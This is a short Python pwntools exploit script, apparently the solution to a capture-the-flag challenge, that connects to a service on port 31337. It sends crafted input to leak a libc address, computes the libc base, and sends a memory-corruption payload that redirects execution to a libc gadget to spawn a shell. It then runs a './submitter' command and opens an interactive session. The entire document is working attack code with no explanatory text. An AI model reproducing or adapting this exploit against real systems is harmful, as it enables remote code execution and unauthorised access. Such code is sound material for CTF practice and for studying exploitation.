#!/usr/bin/env python3

from pwn import *

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

p = remote(HOST, int(PORT))

p.sendlineafter(b'?', b'10')
p.sendlineafter(b'?', b'4')

p.send(b'a'*9+b'\x88')

p.send(b'\x88'*0x88)
p.send(b'\xff'*0x88)

libc_base = u64(p.recvuntil(b'\x7f').replace(b'\x1B[1;30;42m',b'').replace(b'\x1B[1;30;43m',b'').replace(b'\x1B[0m',b'').replace(b' ',b'')[-6:].ljust(8,b'\x00')) - 0x29d90
print(f'libc_base = {hex(libc_base)}')

p.clean()

pay = b'b'*(0x30-2-0x8)
pay += p64(libc_base+0x21c000)
pay += p64(libc_base+0xebdb3)
pay += b'\n./submitter\n'*10
pay += b' '*(0xff-len(pay))
p.send(pay)

p.clean()

p.sendline(b'./submitter')
p.sendline(b'./submitter')
p.sendline(b'./submitter')


p.interactive()